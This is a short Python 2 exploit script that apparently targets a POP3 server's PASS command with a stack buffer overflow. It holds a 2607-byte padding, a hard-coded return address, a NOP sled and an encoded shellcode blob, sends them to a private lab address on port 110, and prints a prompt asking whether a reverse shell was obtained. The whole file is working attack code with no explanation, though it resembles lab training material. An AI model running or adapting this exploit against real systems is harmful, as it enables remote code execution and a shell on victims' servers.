#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xbf\x44\xb3\x88\xf4\xdb\xce\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
            "\x52\x31\x7e\x12\x83\xc6\x04\x03\x3a\xbd\x6a\x01\x3e\x29\xe8"
            "\xea\xbe\xaa\x8d\x63\x5b\x9b\x8d\x10\x28\x8c\x3d\x52\x7c\x21"
            "\xb5\x36\x94\xb2\xbb\x9e\x9b\x73\x71\xf9\x92\x84\x2a\x39\xb5"
            "\x06\x31\x6e\x15\x36\xfa\x63\x54\x7f\xe7\x8e\x04\x28\x63\x3c"
            "\xb8\x5d\x39\xfd\x33\x2d\xaf\x85\xa0\xe6\xce\xa4\x77\x7c\x89"
            "\x66\x76\x51\xa1\x2e\x60\xb6\x8c\xf9\x1b\x0c\x7a\xf8\xcd\x5c"
            "\x83\x57\x30\x51\x76\xa9\x75\x56\x69\xdc\x8f\xa4\x14\xe7\x54"
            "\xd6\xc2\x62\x4e\x70\x80\xd5\xaa\x80\x45\x83\x39\x8e\x22\xc7"
            "\x65\x93\xb5\x04\x1e\xaf\x3e\xab\xf0\x39\x04\x88\xd4\x62\xde"
            "\xb1\x4d\xcf\xb1\xce\x8d\xb0\x6e\x6b\xc6\x5d\x7a\x06\x85\x09"
            "\x4f\x2b\x35\xca\xc7\x3c\x46\xf8\x48\x97\xc0\xb0\x01\x31\x17"
            "\xb6\x3b\x85\x87\x49\xc4\xf6\x8e\x8d\x90\xa6\xb8\x24\x99\x2c"
            "\x38\xc8\x4c\xe2\x68\x66\x3f\x43\xd8\xc6\xef\x2b\x32\xc9\xd0"
            "\x4c\x3d\x03\x79\xe6\xc4\xc4\x46\x5f\xd6\x79\x2f\xa2\xd6\x80"
            "\x14\x2b\x30\xe8\x7a\x7a\xeb\x85\xe3\x27\x67\x37\xeb\xfd\x02"
            "\x77\x67\xf2\xf3\x36\x80\x7f\xe7\xaf\x60\xca\x55\x79\x7e\xe0"
            "\xf1\xe5\xed\x6f\x01\x63\x0e\x38\x56\x24\xe0\x31\x32\xd8\x5b"
            "\xe8\x20\x21\x3d\xd3\xe0\xfe\xfe\xda\xe9\x73\xba\xf8\xf9\x4d"
            "\x43\x45\xad\x01\x12\x13\x1b\xe4\xcc\xd5\xf5\xbe\xa3\xbf\x91"
            "\x47\x88\x7f\xe7\x47\xc5\x09\x07\xf9\xb0\x4f\x38\x36\x55\x58"
            "\x41\x2a\xc5\xa7\x98\xee\xe5\x45\x08\x1b\x8e\xd3\xd9\xa6\xd3"
            "\xe3\x34\xe4\xed\x67\xbc\x95\x09\x77\xb5\x90\x56\x3f\x26\xe9"
            "\xc7\xaa\x48\x5e\xe7\xfe")

buffer = "A" * 2607 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

try:
    print "\nSending evil buffer..."
    connect = s.connect(("192.168.17.77",110))
    data = s.recv(1024)
    s.send('USER test\r\n')
    data = s.recv(1024)
    s.send('PASS' + buffer + '\r\n')
    s.close()
    print "\ Done. Did you get a reverse shell?"
    print len(buffer)
except:
	print "Could not connect to POP3!"
